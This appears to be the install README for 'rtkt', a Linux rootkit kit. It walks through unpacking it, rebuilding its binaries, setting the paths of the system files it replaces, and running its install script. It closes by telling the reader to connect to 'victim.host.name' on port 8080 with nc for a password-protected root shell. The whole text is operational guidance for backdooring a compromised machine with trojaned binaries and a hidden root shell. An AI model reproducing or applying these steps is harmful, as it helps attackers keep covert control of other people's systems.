rtkt-0.3.0 - by SodaPhish

Acquire the rtkt image from http://sodaphish.com/files/, then:

	# tar -zxvf rtkt-current.tar.gz
	# cd rtkt-X.Y.Z

X.Y.Z will be the version number of the current rtkt image.

If you are on a non x86 Linux system, you will need to:

	# cd src
	# make; make install

which will re-build all the binaries in the kit for the host system,
otherwise, you can just:

	# ./mkrtkt

Regardless of whether or not you have to rebuild the binaries, you 
should make sure you have the paths of the files you're planning on 
replacing correct in the src/*/*.c files. 

If you haven't already done so, run the install script: 

	# ./mkrtkt

You should be done.  You can now use `nc` to connect to port 8080 
i.e. `nc victim.host.name 8080` on the box and have a protected root 
shell.  The install script will tell you the password protecting
the rootshell, and you're certainly free to change it.
